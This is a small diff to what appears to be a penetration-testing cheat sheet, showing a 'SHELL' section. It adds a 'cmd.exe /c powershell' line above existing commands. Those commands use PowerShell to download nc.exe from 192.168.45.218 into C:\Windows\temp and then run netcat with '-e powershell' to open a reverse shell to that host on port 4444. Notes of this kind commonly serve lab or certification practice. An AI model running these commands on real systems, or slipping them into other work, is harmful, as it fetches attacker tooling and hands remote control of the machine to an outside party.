@@ -497,6 +497,8 @@ reset
 ### SHELL
 ```powershell
 #nc.exe
+cmd.exe /c powershell 
+
 powershell -nop -c "iwr -Uri http://192.168.45.218/nc.exe -Outfile C:\Windows\temp\nc.exe"
 C:\Windows\temp\nc.exe 192.168.45.218 4444 -e powershell
 
